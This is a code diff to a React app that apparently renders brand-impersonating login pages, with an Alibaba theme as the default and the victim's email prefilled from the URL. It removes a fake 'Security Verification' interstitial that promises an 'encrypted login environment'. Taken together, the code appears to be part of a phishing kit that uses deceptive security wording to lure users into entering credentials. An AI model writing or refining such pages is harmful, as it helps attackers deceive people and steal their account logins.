@@ -21,7 +21,6 @@ const AppContent: React.FC = () => {
   const { lang } = useTranslation();
   const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(true);
-  const [isVerified, setIsVerified] = useState(false);
 
   const email = useMemo(() => {
     const params = new URLSearchParams(window.location.search);
@@ -75,35 +74,6 @@ const AppContent: React.FC = () => {
       default: return <AlibabaTheme prefilledEmail={email} />;
     }
   };
-
-  if (!isVerified && !email) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
-        <div className="max-w-md w-full bg-white p-8 rounded-xl shadow-sm border border-gray-100 text-center">
-          <div className="w-16 h-16 bg-blue-50 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-6 text-2xl">
-            🛡️
-          </div>
-          <h1 className="text-xl font-bold text-gray-800 mb-2">
-            {lang === 'zh' ? '安全验证' : 'Security Verification'}
-          </h1>
-          <p className="text-gray-500 text-sm mb-8">
-            {lang === 'zh' ? '为了您的账号安全，请点击下方按钮进入加密登录环境。' : 'For your account security, please click the button below to enter the encrypted login environment.'}
-          </p>
-          <button 
-            onClick={() => setIsVerified(true)}
-            className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors"
-          >
-            {lang === 'zh' ? '进入安全登录' : 'Enter Secure Login'}
-          </button>
-          <div className="mt-6 pt-6 border-t border-gray-50 flex items-center justify-center space-x-4 opacity-40 grayscale">
-             <div className="w-8 h-8 bg-gray-200 rounded"></div>
-             <div className="w-8 h-8 bg-gray-200 rounded"></div>
-             <div className="w-8 h-8 bg-gray-200 rounded"></div>
-          </div>
-        </div>
-      </div>
-    );
-  }
 
   return (
     <AnimatePresence mode="wait">
